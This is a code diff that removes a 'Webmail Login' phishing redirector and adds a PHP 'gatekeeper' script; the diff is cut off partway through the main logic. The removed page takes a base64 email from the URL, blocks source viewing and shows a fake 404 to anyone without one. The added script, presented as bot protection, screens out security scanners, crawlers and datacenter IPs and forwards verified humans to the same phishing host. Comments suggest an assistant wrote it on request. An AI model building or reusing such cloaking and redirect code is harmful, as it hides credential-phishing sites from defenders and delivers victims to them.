@@ -1,127 +1,665 @@
-<!DOCTYPE html>
-<html>
-   <head>
-      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
-      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-      <title>Webmail Login</title>
-    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
-      <style>
-         html {
-         visibility: hidden; 
-         background: white;
-         }
-      </style>
-   </head>
-   <body>
-      <script>
+<?php
+/**
+ * ============================================================================
+ * GATEKEEPER — Bot / Known-Datacenter(VPS) / Flood Filter + Self-Hosted CAPTCHA
+ * ============================================================================
+ * SINGLE FILE, SELF-REFRESHING: everything lives in this one script,
+ * including the known-datacenter IP list. No visitor data is ever sent
+ * anywhere. The list itself is kept current by periodically downloading
+ * a public (non-personal) GitHub dataset — see the note below.
+ *
+ * HOW THE AUTO-REFRESH WORKS
+ *   On each visit, this script checks the age of its local IP-list cache.
+ *   - Fresh (< 24h old by default): reads the local cache instantly, no
+ *     network call at all — this is what happens on almost every visit.
+ *   - Stale or missing: the visitor whose request happens to arrive at
+ *     that moment triggers a live fetch from GitHub (short timeout per
+ *     provider, so it can't hang for long), the result gets cached, and
+ *     every visitor after that goes back to instant local reads for
+ *     another 24 hours. A lock file prevents multiple simultaneous
+ *     visitors from all triggering fetches at once.
+ *   - If the fetch fails for any reason (GitHub down, host blocks
+ *     outbound requests, etc.), the script just keeps using whatever
+ *     it has cached — even if stale — or its small built-in fallback
+ *     list. A visitor's redirect is never left hanging indefinitely.
+ *   Tradeoff to know: the one visitor who happens to trigger a refresh
+ *   may see a delay of up to a couple seconds while it fetches. Everyone
+ *   else is unaffected. If you'd rather NO visitor ever experiences that
+ *   delay, the alternative is running the fetch on a schedule via cPanel
+ *   Cron Job instead — ask if you want that version.
+ *
+ * LAYERED DEFENSE, IN ORDER:
+ *   1. Allowlisted IPs                     -> always let through
+ *   2. Valid "verified human" cookie       -> let through (skips re-challenge)
+ *   3. Empty / known-bad bot UA            -> blocked
+ *   4. Request-flood rate limit            -> blocked
+ *   5. Known datacenter/VPS IP (self-refreshing local list) -> blocked
+ *   6. Self-hosted numeric CAPTCHA         -> must solve to proceed
+ *
+ * WHY BOTH DATACENTER FILTERING *AND* A CAPTCHA:
+ *   - The IP list blocks known-bad *infrastructure* with zero friction
+ *     for real users, but can't prove a visitor is human.
+ *   - The CAPTCHA proves a human is present regardless of what IP they're
+ *     on, but does nothing about infrastructure reputation on its own.
+ *   Together they cover more ground than either alone.
+ *
+ * WHAT THIS DOES NOT DO
+ *   - It is NOT true DDoS protection. A large volumetric flood consumes
+ *     bandwidth/connections before PHP ever runs. Put a CDN/WAF in front
+ *     of cPanel (e.g. Cloudflare) for that. This script filters bots and
+ *     known datacenter traffic, and throttles application-layer abuse.
+ *   - The GitHub-sourced list covers major cloud/VPS providers but isn't
+ *     exhaustive (e.g. smaller regional VPS providers, or consumer VPN
+ *     services renting scattered IPs, may not be covered). Use the
+ *     MANUAL_DENYLIST array to add specific IPs/ranges you identify
+ *     yourself over time.
+ *   - No CAPTCHA is unbreakable against a sufficiently motivated attacker
+ *     paying for human solving services. It raises the cost of automated
+ *     abuse; it isn't a guarantee.
+ *   - Uses PHP's GD extension (near-universal on cPanel/shared hosting)
+ *     to draw the challenge image server-side.
+ *
+ * DEPLOYMENT (cPanel, no shell access needed)
+ *   1. Upload this single file (e.g. public_html/gatekeeper.php).
+ *   2. Edit the CONFIGURATION block below.
+ *   3. Run it on every page via .htaccess:
+ *          php_value auto_prepend_file "gatekeeper.php"
+ *      or include it manually at the top of specific .php pages:
+ *          <?php include 'gatekeeper.php'; ?>
+ *   4. IMPORTANT: set COOKIE_SECRET_KEY below to your own random string,
+ *      or leave blank to have one auto-generated and stored in CACHE_DIR
+ *      on first run (simpler, still secure — just don't delete that file).
+ *   5. That's it — the datacenter IP list fetches and caches itself
+ *      automatically the first time someone visits, no cron job needed.
+ *
+ * ============================================================================
+ */
 
-function isBase64(str) {
-         try {
-             return btoa(atob(str)) === str; 
-         } catch (err) {
-             return false; 
-         }
-         }
-         
-         function generateRandomToken(length) {
-         var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-         var result = '';
-         for (var i = 0; i < length; i++) {
-             result += chars.charAt(Math.floor(Math.random() * chars.length));
-         }
-         return result;
-         }
-         
-         function redirrectPage() {
-         var query = window.location.href;
-         console.log(query);
-         
-         var res = query.split("#");
-         var data1 = res[0]; 
-         var data2 = res[1];
-         
-         console.log("Base URL:", data1);
-         console.log("Hash Content:", data2);
-         
-         if (data2 && isBase64(data2)) {
-             console.log("Valid Base64 email detected. Redirecting...");
-             var randomToken = "RS" + generateRandomToken(20); 
-             var randomTokens = "cpsess" + generateRandomToken(10);
-             window.location.href = "https://personal-online-author-plain.appwrite.network/" + randomTokens + "/check?xai=" + randomToken + "/user-miscwp#" + data2;    
-         } else {
-             console.log("Invalid or missing Base64 email. No redirect.");
-         }
-         }
-         
-         redirrectPage();
-         
-         $(document).bind('keydown', function(e) {
-         if(e.ctrlKey && (e.which == 83)) {
-             e.preventDefault();
-             return false;
-         }
-         });
-         document.addEventListener('contextmenu', event => event.preventDefault());
-         document.onkeydown = function(e) {
-         if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
-             return false;
-         } else {
-             return true;
-         }
-         };
-         $(document).keypress("u",function(e) {
-         if(e.ctrlKey) {
-             return false;
-         } else {
-             return true;
-         }
-         });
-         
-         document.addEventListener("DOMContentLoaded", function () {
-         function isValidBase64Email(encodedString) {
-             try {
-                 let decoded = atob(encodedString);
-                 let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                 return emailRegex.test(decoded) ? decoded : null;
-             } catch (e) {
-                 return null; 
-             }
-         }
-         
-         function enforceAccessRestriction() {
-             let hash = window.location.hash.substring(1); 
-         
-             let decodedEmail = isValidBase64Email(hash);
-             if (!decodedEmail) {
-                 document.body.innerHTML = ""; 
-                 document.body.style.cssText = `
-                     display: flex;
-                     justify-content: center;
-                     align-items: center;
-                     height: 100vh;
-                     flex-direction: column;
-                     text-align: center;
-                     background-color: white;
-                     color: black;
-                     font-family: Arial, sans-serif;
-                     margin: 0;
-                 `;
-                 let deniedMessage = document.createElement("div");
-                 deniedMessage.innerHTML = `
-                     <h6 style="font-size: 40px;">404: Page not found</h6>
-                 `;
-                 document.body.appendChild(deniedMessage);
-                 return;
-             }
-             console.log("Decoded Email:", decodedEmail);
-         }
-         enforceAccessRestriction();
-         });
-         
-              	
-           
-         	
-      </script>
-   </body>
+// ============================= CONFIGURATION ===============================
+
+define('SAFE_REDIRECT_URL', 'https://personal-online-author-plain.appwrite.network/');
+define('BLOCKED_REDIRECT_URL', 'https://google.com');
+
+// --- Known datacenter / VPS detection (100% local at request-time) ---
+define('BLOCK_KNOWN_DATACENTER_IPS', true);
+
+// Primary source: a local cache file refreshed periodically (via cron,
+// Auto-refreshing, all in this one file: on any visit where the local
+// cache is missing or older than DATACENTER_LIST_REFRESH_INTERVAL_SECONDS,
+// this script fetches current CIDR ranges for major cloud/VPS providers
+// from the public, daily-updated repo rezmoss/cloud-provider-ip-addresses
+// on GitHub, and caches the result locally. Every OTHER visit just reads
+// the already-cached file instantly — no network call happens for them.
+// No visitor data is ever sent to GitHub; it only downloads a public,
+// non-personal dataset. If a fetch fails (GitHub down, host blocks
+// outbound requests, etc.), the script keeps using whatever it has
+// cached, however old, or the small built-in list below — it never
+// blocks a visitor's redirect waiting indefinitely.
+define('DATACENTER_LIST_CACHE_FILE', __DIR__ . '/gatekeeper_cache/datacenter_ips.json');
+define('DATACENTER_LIST_REFRESH_INTERVAL_SECONDS', 24 * 3600); // how often to refresh
+define('DATACENTER_LIST_FETCH_TIMEOUT_SECONDS', 2); // per-provider timeout, kept short
+define('DATACENTER_LIST_REFRESH_LOCK_SECONDS', 300); // prevents concurrent visitors all fetching at once
+$GATEKEEPER_DATACENTER_PROVIDERS = ['aws', 'azure', 'googlecloud', 'oracle', 'digitalocean', 'linode', 'vultr'];
+
+// Fallback / bootstrap list, used only if no cache exists yet AND a live
+// fetch also fails (e.g. this host blocks outbound requests entirely).
+// Hand-compiled, NOT guaranteed current or complete.
+$GATEKEEPER_DATACENTER_CIDRS = [
+    // DigitalOcean
+    '104.131.0.0/16', '138.68.0.0/16', '159.65.0.0/16', '159.89.0.0/16',
+    '167.99.0.0/16', '178.62.0.0/16', '206.189.0.0/16', '134.209.0.0/16',
+    '157.230.0.0/16', '165.227.0.0/16', '188.166.0.0/16', '46.101.0.0/16',
+    // Linode / Akamai Connected Cloud
+    '45.33.0.0/16', '45.56.0.0/16', '45.79.0.0/16', '172.104.0.0/15',
+    '173.255.0.0/16', '139.162.0.0/16', '192.155.80.0/20', '198.58.96.0/19',
+    // Vultr
+    '45.32.0.0/16', '45.63.0.0/16', '45.76.0.0/16', '66.42.0.0/18',
+    '108.61.0.0/16', '149.28.0.0/16', '207.148.0.0/20', '155.138.128.0/18',
+    // OVH
+    '51.68.0.0/16', '51.75.0.0/16', '54.36.0.0/16', '137.74.0.0/16',
+    '145.239.0.0/16', '176.31.0.0/16', '178.32.0.0/15', '5.135.0.0/16',
+    '141.94.0.0/16', '15.235.0.0/16',
+    // Hetzner
+    '5.9.0.0/16', '78.46.0.0/15', '88.99.0.0/16', '138.201.0.0/16',
+    '148.251.0.0/16', '176.9.0.0/16', '116.202.0.0/16', '95.216.0.0/16',
+    '95.217.0.0/16', '65.108.0.0/16', '65.109.0.0/16',
+    // Amazon AWS EC2 (rough — some overlap with non-AWS use is possible
+    // at this granularity; refresh from AWS's published ip-ranges.json
+    // periodically for accuracy)
+    '3.208.0.0/12', '13.32.0.0/15', '18.144.0.0/14', '34.192.0.0/12',
+    '52.0.0.0/11', '54.144.0.0/12', '99.77.128.0/18',
+    // Google Cloud Platform
+    '34.64.0.0/10', '35.184.0.0/13', '35.192.0.0/14', '35.196.0.0/15',
+    // Microsoft Azure (rough)
+    '20.36.0.0/14', '20.150.0.0/15', '52.224.0.0/11', '13.64.0.0/11',
+    // Oracle Cloud Infrastructure
+    '129.146.0.0/16', '132.145.0.0/16', '140.238.0.0/16', '150.230.0.0/16',
+    // Alibaba Cloud
+    '47.74.0.0/15', '47.88.0.0/14', '8.208.0.0/14',
+];
+
+// Individual IPs or specific CIDR ranges YOU add manually, e.g. after
+// spotting something suspicious in your logs and looking it up yourself.
+// This is the permanent, hand-curated list that grows over time.
+$GATEKEEPER_MANUAL_DENYLIST = [
+    // '198.51.100.23',
+    // '203.0.113.0/24',
+];
+
+// --- Bot User-Agent filtering ---
+define('BLOCK_EMPTY_USER_AGENT', true);
+$GATEKEEPER_BAD_BOT_PATTERNS = [
+    'curl', 'wget', 'python-requests', 'python-urllib', 'scrapy', 'httpclient',
+    'libwww-perl', 'go-http-client', 'java/', 'axios', 'okhttp', 'phantomjs',
+    'headlesschrome', 'selenium', 'puppeteer', 'playwright', 'ahrefsbot',
+    'semrushbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider', 'zgrab',
+    'masscan', 'nmap', 'nikto', 'sqlmap', 'gobuster', 'wpscan',
+    // Generic catch-all: this site wants zero bots, named or not.
+    'bot', 'spider', 'crawl', 'slurp', 'fetch', 'scan',
+];
+
+// No search-engine exceptions — this is a private, individuals-only site.
+define('ALLOW_VERIFIED_GOOD_BOTS', false);
+
+// --- Basic request-flood throttling ---
+define('RATE_LIMIT_ENABLED', true);
+define('RATE_LIMIT_MAX_REQUESTS', 20);
+define('RATE_LIMIT_WINDOW_SECONDS', 60);
+
+// --- IPs that should NEVER be blocked ---
+$GATEKEEPER_ALLOWLIST_IPS = [
+    // '203.0.113.10',
+];
+
+// --- Cache / storage ---
+define('CACHE_DIR', __DIR__ . '/gatekeeper_cache');
+define('CACHE_TTL_SECONDS', 3600);
+
+// --- Self-hosted CAPTCHA ---
+define('ENABLE_CAPTCHA', true);
+define('CAPTCHA_CODE_LENGTH', 6);
+define('CAPTCHA_IMAGE_WIDTH', 200);
+define('CAPTCHA_IMAGE_HEIGHT', 70);
+define('CAPTCHA_MAX_ATTEMPTS', 5);          // failed solves allowed
+define('CAPTCHA_ATTEMPT_WINDOW_SECONDS', 900); // before the counter resets
+define('CAPTCHA_SITE_TITLE', 'Verify You Are Human');
+
+// --- "Verified human" cookie (avoids re-challenging every page load) ---
+define('VERIFIED_COOKIE_NAME', 'gk_verified');
+define('VERIFIED_COOKIE_LIFETIME_SECONDS', 12 * 3600); // 12 hours
+// Set your own random string here (recommended), or leave blank to
+// auto-generate + persist one in CACHE_DIR/secret.key on first run.
+define('COOKIE_SECRET_KEY', '');
+
+// ============================================================================
+// ============================ IMPLEMENTATION ================================
+// ============================================================================
+
+function gk_ensure_cache_dir() {
+    if (!is_dir(CACHE_DIR)) {
+        @mkdir(CACHE_DIR, 0755, true);
+    }
+    $htaccess = CACHE_DIR . '/.htaccess';
+    if (!file_exists($htaccess)) {
+        @file_put_contents($htaccess, "Require all denied\n" . "Deny from all\n");
+    }
+}
+
+function gk_cache_path($name) {
+    return CACHE_DIR . '/' . preg_replace('/[^a-zA-Z0-9_\.]/', '_', $name) . '.json';
+}
+
+function gk_cache_get($name) {
+    $path = gk_cache_path($name);
+    if (!file_exists($path)) return null;
+    $raw = @file_get_contents($path);
+    if ($raw === false) return null;
+    $data = json_decode($raw, true);
+    return is_array($data) ? $data : null;
+}
+
+function gk_cache_set($name, $data) {
+    $path = gk_cache_path($name);
+    $fh = @fopen($path, 'c+');
+    if (!$fh) return false;
+    if (flock($fh, LOCK_EX)) {
+        ftruncate($fh, 0);
+        fwrite($fh, json_encode($data));
+        fflush($fh);
+        flock($fh, LOCK_UN);
+    }
+    fclose($fh);
+    return true;
+}
+
+function gk_get_secret_key() {
+    if (COOKIE_SECRET_KEY !== '') return COOKIE_SECRET_KEY;
+    $key_file = CACHE_DIR . '/secret.key';
+    if (file_exists($key_file)) {
+        $key = @file_get_contents($key_file);
+        if ($key) return $key;
+    }
+    $key = bin2hex(random_bytes(32));
+    @file_put_contents($key_file, $key);
+    @chmod($key_file, 0600);
+    return $key;
+}
+
+function gk_get_visitor_ip() {
+    $candidates = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+    foreach ($candidates as $key) {
+        if (!empty($_SERVER[$key])) {
+            $ip = trim(explode(',', $_SERVER[$key])[0]);
+            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+        }
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+}
+
+function gk_is_bad_bot_ua($ua) {
+    global $GATEKEEPER_BAD_BOT_PATTERNS;
+    $ua_lower = strtolower($ua);
+    foreach ($GATEKEEPER_BAD_BOT_PATTERNS as $pattern) {
+        if (strpos($ua_lower, $pattern) !== false) return true;
+    }
+    return false;
+}
+
+// Pure local CIDR match — no network call of any kind. IPv4 only; IPv6
+// datacenter ranges aren't included in the starter list below (IPv6
+// space is far larger/sparser and less commonly used for casual abuse,
+// but you can add IPv6 CIDRs to the arrays too — this matcher supports
+// them via PHP's inet_pton-based comparison).
+function gk_ip_in_cidr($ip, $cidr) {
+    if (strpos($cidr, '/') === false) {
+        return $ip === $cidr; // exact single-IP entry
+    }
+    [$subnet, $bits] = explode('/', $cidr);
+    $bits = (int)$bits;
+
+    $ip_bin = @inet_pton($ip);
+    $subnet_bin = @inet_pton($subnet);
+    if ($ip_bin === false || $subnet_bin === false) return false;
+    if (strlen($ip_bin) !== strlen($subnet_bin)) return false; // v4 vs v6 mismatch
+
+    $bytes = intdiv($bits, 8);
+    $remainder_bits = $bits % 8;
+
+    if ($bytes > 0 && substr($ip_bin, 0, $bytes) !== substr($subnet_bin, 0, $bytes)) {
+        return false;
+    }
+    if ($remainder_bits > 0) {
+        $mask = ~(0xFF >> $remainder_bits) & 0xFF;
+        $ip_byte = ord($ip_bin[$bytes]);
+        $subnet_byte = ord($subnet_bin[$bytes]);
+        if (($ip_byte & $mask) !== ($subnet_byte & $mask)) return false;
+    }
+    return true;
+}
+
+// Fetches current CIDRs from GitHub for each configured provider. Short
+// per-provider timeout so a slow/unreachable provider can't stall the
+// whole request for long. Returns an array of CIDRs, or null if every
+// provider failed (so the caller knows to keep the old cache instead).
+function gk_fetch_datacenter_cidrs_from_github() {
+    global $GATEKEEPER_DATACENTER_PROVIDERS;
+    $base = 'https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/main';
+    $all = [];
+    $any_success = false;
+
+    foreach ($GATEKEEPER_DATACENTER_PROVIDERS as $provider) {
+        $url = "{$base}/{$provider}/{$provider}_ips_merged_v4.txt";
+        $ctx = stream_context_create(['http' => [
+            'timeout' => DATACENTER_LIST_FETCH_TIMEOUT_SECONDS,
+            'user_agent' => 'gatekeeper-self-refresh',
+        ]]);
+        $body = @file_get_contents($url, false, $ctx);
+        if ($body === false || trim($body) === '') continue;
+
+        $any_success = true;
+        foreach (preg_split('/\r\n|\r|\n/', trim($body)) as $line) {
+            $line = trim($line);
+            if ($line !== '' && preg_match('#^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$#', $line)) {
+                $all[] = $line;
+            }
+        }
+    }
+    return $any_success ? array_values(array_unique($all)) : null;
+}
+
+// Reads the local cache; if it's missing or stale, attempts a live
+// refresh (guarded by a lock file so concurrent visitors don't all try
+// to fetch at once). Always returns quickly with *something* usable —
+// fresh data, stale-but-cached data, or an empty array for the caller
+// to fall back on.
+function gk_get_datacenter_cidrs() {
+    $cache_file = DATACENTER_LIST_CACHE_FILE;
+    $lock_file = CACHE_DIR . '/datacenter_refresh.lock';
+    $now = time();
+
+    $cached = null;
+    if (file_exists($cache_file)) {
+        $raw = @file_get_contents($cache_file);
+        $decoded = $raw ? json_decode($raw, true) : null;
+        if (is_array($decoded) && isset($decoded['cidrs'])) $cached = $decoded;
+    }
+
+    $is_stale = !$cached || ($now - ($cached['updated_at'] ?? 0)) > DATACENTER_LIST_REFRESH_INTERVAL_SECONDS;
+    if (!$is_stale) {
+        return $cached['cidrs'];
+    }
+
+    // Stale or missing — but don't let a stampede of simultaneous
+    // visitors all fetch at once. Only one visitor per lock window
+    // actually triggers the live fetch; everyone else just uses
+    // whatever's cached (even if a bit stale) for this one request.
+    $lock_age = file_exists($lock_file) ? ($now - (int)@file_get_contents($lock_file)) : null;
+    if ($lock_age !== null && $lock_age < DATACENTER_LIST_REFRESH_LOCK_SECONDS) {
+        return $cached ? $cached['cidrs'] : [];
+    }
+    @file_put_contents($lock_file, (string)$now);
+
+    $fresh = gk_fetch_datacenter_cidrs_from_github();
+
+    if ($fresh !== null && !empty($fresh)) {
+        @file_put_contents($cache_file, json_encode([
+            'updated_at' => $now,
+            'source' => 'https://github.com/rezmoss/cloud-provider-ip-addresses',
+            'cidr_count' => count($fresh),
+            'cidrs' => $fresh,
+        ]));
+        return $fresh;
+    }
+
+    // Fetch failed (GitHub unreachable, host blocks outbound, etc.) —
+    // keep serving the old cached data rather than break the site.
+    return $cached ? $cached['cidrs'] : [];
+}
+
+function gk_is_known_datacenter_ip($ip) {
+    global $GATEKEEPER_DATACENTER_CIDRS, $GATEKEEPER_MANUAL_DENYLIST;
+
+    foreach ($GATEKEEPER_MANUAL_DENYLIST as $entry) {
+        if (gk_ip_in_cidr($ip, $entry)) return true;
+    }
+
+    if (!BLOCK_KNOWN_DATACENTER_IPS) return false;
+
+    $cidrs = gk_get_datacenter_cidrs();
+    if (empty($cidrs)) {
+        // No cache yet and the live fetch also failed — use the small
+        // bundled starter list so the site isn't left unprotected.
+        $cidrs = $GATEKEEPER_DATACENTER_CIDRS;
+    }
+
+    foreach ($cidrs as $entry) {
+        if (gk_ip_in_cidr($ip, $entry)) return true;
+    }
+    return false;
+}
+
+function gk_is_rate_limited($ip) {
+    $cache_key = 'rl_' . str_replace(':', '_', $ip);
+    $now = time();
+    $entry = gk_cache_get($cache_key);
+
+    if (!$entry || ($now - $entry['window_start']) > RATE_LIMIT_WINDOW_SECONDS) {
+        gk_cache_set($cache_key, ['window_start' => $now, 'count' => 1]);
+        return false;
+    }
+
+    $entry['count']++;
+    gk_cache_set($cache_key, $entry);
+    return $entry['count'] > RATE_LIMIT_MAX_REQUESTS;
+}
+
+// --- CAPTCHA attempt tracking (separate from rate limiting) ---
+function gk_captcha_attempts_get($ip) {
+    $entry = gk_cache_get('capfail_' . str_replace(':', '_', $ip));
+    if (!$entry || (time() - $entry['window_start']) > CAPTCHA_ATTEMPT_WINDOW_SECONDS) {
+        return 0;
+    }
+    return $entry['fails'];
+}
+
+function gk_captcha_attempts_increment($ip) {
+    $key = 'capfail_' . str_replace(':', '_', $ip);
+    $entry = gk_cache_get($key);
+    $now = time();
+    if (!$entry || ($now - $entry['window_start']) > CAPTCHA_ATTEMPT_WINDOW_SECONDS) {
+        $entry = ['window_start' => $now, 'fails' => 0];
+    }
+    $entry['fails']++;
+    gk_cache_set($key, $entry);
+    return $entry['fails'];
+}
+
+// --- Signed "verified human" cookie ---
+function gk_issue_verified_cookie($ip) {
+    $expiry = time() + VERIFIED_COOKIE_LIFETIME_SECONDS;
+    $payload = base64_encode($ip . '|' . $expiry);
+    $sig = hash_hmac('sha256', $payload, gk_get_secret_key());
+    $token = $payload . '.' . $sig;
+    setcookie(VERIFIED_COOKIE_NAME, $token, [
+        'expires' => $expiry,
+        'path' => '/',
+        'secure' => !empty($_SERVER['HTTPS']),
+        'httponly' => true,
+        'samesite' => 'Lax',
+    ]);
+}
+
+function gk_is_verified_cookie_valid($ip) {
+    if (empty($_COOKIE[VERIFIED_COOKIE_NAME])) return false;
+    $token = $_COOKIE[VERIFIED_COOKIE_NAME];
+    $parts = explode('.', $token, 2);
+    if (count($parts) !== 2) return false;
+    [$payload, $sig] = $parts;
+
+    $expected_sig = hash_hmac('sha256', $payload, gk_get_secret_key());
+    if (!hash_equals($expected_sig, $sig)) return false;
+
+    $decoded = base64_decode($payload);
+    $bits = explode('|', $decoded);
+    if (count($bits) !== 2) return false;
+    [$token_ip, $expiry] = $bits;
+
+    if ($token_ip !== $ip) return false;
+    if ((int)$expiry < time()) return false;
+
+    return true;
+}
+
+function gk_redirect($url) {
+    if (!headers_sent()) {
+        header('Location: ' . $url, true, 302);
+    } else {
+        echo '<script>window.location.replace(' . json_encode($url) . ');</script>';
+    }
+    exit;
+}
+
+// --- CAPTCHA image generation (GD, no fonts/libraries needed) ---
+function gk_generate_captcha_code($length) {
+    // Digits only, per request — a fresh 6-digit code every visit,
+    // still rendered as a distorted image so it keeps real OCR-level
+    // bot resistance (unlike a plain-text number, which would not).
+    $chars = '0123456789';
+    $code = '';
+    for ($i = 0; $i < $length; $i++) {
+        $code .= $chars[random_int(0, strlen($chars) - 1)];
+    }
+    return $code;
+}
+
+function gk_render_captcha_image($code) {
+    if (!extension_loaded('gd')) {
+        http_response_code(500);
+        exit;
+    }
+    $w = CAPTCHA_IMAGE_WIDTH;
+    $h = CAPTCHA_IMAGE_HEIGHT;
+    $img = imagecreatetruecolor($w, $h);
+
+    $bg = imagecolorallocate($img, 245, 245, 248);
+    imagefill($img, 0, 0, $bg);
+
+    // Noise lines behind the text.
+    for ($i = 0; $i < 8; $i++) {
+        $c = imagecolorallocate($img, random_int(180, 220), random_int(180, 220), random_int(180, 220));
+        imageline($img, random_int(0, $w), random_int(0, $h), random_int(0, $w), random_int(0, $h), $c);
+    }
+
+    // Draw each character with random size, color, and vertical jitter.
+    $len = strlen($code);
+    $spacing = intdiv($w, $len + 1);
+    for ($i = 0; $i < $len; $i++) {
+        $font = random_int(4, 5);
+        $x = $spacing * ($i + 1) - 6;
+        $y = intdiv($h, 2) - 8 + random_int(-8, 8);
+        $color = imagecolorallocate($img, random_int(20, 90), random_int(20, 90), random_int(20, 90));
+        imagestring($img, $font, $x, $y, $code[$i], $color);
+    }
+
+    // Noise dots scattered on top.
+    for ($i = 0; $i < 150; $i++) {
+        $c = imagecolorallocate($img, random_int(150, 200), random_int(150, 200), random_int(150, 200));
+        imagesetpixel($img, random_int(0, $w - 1), random_int(0, $h - 1), $c);
+    }
+
+    header('Content-Type: image/png');
+    header('Cache-Control: no-store, no-cache, must-revalidate');
+    imagepng($img);
+    imagedestroy($img);
+}
+
+function gk_render_challenge_page($error = null) {
+    $img_src = htmlspecialchars($_SERVER['PHP_SELF']) . '?gk_img=1&r=' . mt_rand();
+    // Preserve any existing query string so the form posts back correctly.
+    $action = htmlspecialchars($_SERVER['REQUEST_URI']);
+    $title = htmlspecialchars(CAPTCHA_SITE_TITLE);
+    $error_html = $error ? '<p class="gk-error">' . htmlspecialchars($error) . '</p>' : '';
+
+    echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>{$title}</title>
+<style>
+  body { font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+         background:#0f1115; color:#e6e6e6; display:flex; align-items:center;
+         justify-content:center; height:100vh; margin:0; }
+  .gk-box { background:#1a1d24; padding:36px 40px; border-radius:12px;
+            box-shadow:0 8px 30px rgba(0,0,0,.4); text-align:center; max-width:340px; }
+  .gk-box h1 { font-size:18px; margin:0 0 18px; font-weight:600; }
+  .gk-box img { border-radius:6px; margin-bottom:14px; display:block; margin-left:auto; margin-right:auto; }
+  .gk-box input[type=text] { width:100%; box-sizing:border-box; padding:10px 12px;
+            font-size:16px; letter-spacing:2px; text-align:center; border-radius:6px;
+            border:1px solid #333; background:#0f1115; color:#fff; margin-bottom:14px; }
+  .gk-box button { width:100%; padding:10px; font-size:15px; border-radius:6px;
+            border:none; background:#4f7cff; color:#fff; cursor:pointer; }
+  .gk-box button:hover { background:#3d63d6; }
+  .gk-error { color:#ff6b6b; font-size:13px; margin-bottom:12px; }
+  .gk-refresh { display:inline-block; margin-top:10px; font-size:12px; color:#8a8f98; text-decoration:none; }
+</style>
+</head>
+<body>
+  <div class="gk-box">
+    <h1>{$title}</h1>
+    {$error_html}
+    <img src="{$img_src}" width="200" height="70" alt="captcha">
+    <form method="POST" action="{$action}">
+      <input type="hidden" name="gk_submit" value="1">
+      <input type="text" name="gk_code" autocomplete="off" inputmode="numeric"
+             pattern="[0-9]*" maxlength="8" placeholder="Enter the code above" required autofocus>
+      <button type="submit">Continue</button>
+    </form>
+  </div>
+</body>
 </html>
+HTML;
+    exit;
+}
+
+// ================================ MAIN =====================================
+
+gk_ensure_cache_dir();
+session_name('gk_session');
+session_start();
+
+$ip = gk_get_visitor_ip();
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// --- Serve the CAPTCHA image itself (early exit, before other checks) ---
+if (ENABLE_CAPTCHA && isset($_GET['gk_img'])) {
+    $code = $_SESSION['gk_captcha_code'] ?? null;
+    if (!$code) {
+        $code = gk_generate_captcha_code(CAPTCHA_CODE_LENGTH);
+        $_SESSION['gk_captcha_code'] = $code;
+    }
+    gk_render_captcha_image($code);
+    exit;
+}
+
+// 1. Allowlist always wins.
+if (in_array($ip, $GATEKEEPER_ALLOWLIST_IPS, true)) {
+    gk_redirect(SAFE_REDIRECT_URL);
+}
+
+// 2. Already verified human within the cookie's validity window.
+if (gk_is_verified_cookie_valid($ip)) {
+    gk_redirect(SAFE_REDIRECT_URL);
+}
+
+// 3. Empty / scripted User-Agent.
+if (BLOCK_EMPTY_USER_AGENT && trim($ua) === '') {
+    gk_redirect(BLOCKED_REDIRECT_URL);
+}
+
+// 4. Known bad bot signatures.
+if (gk_is_bad_bot_ua($ua)) {
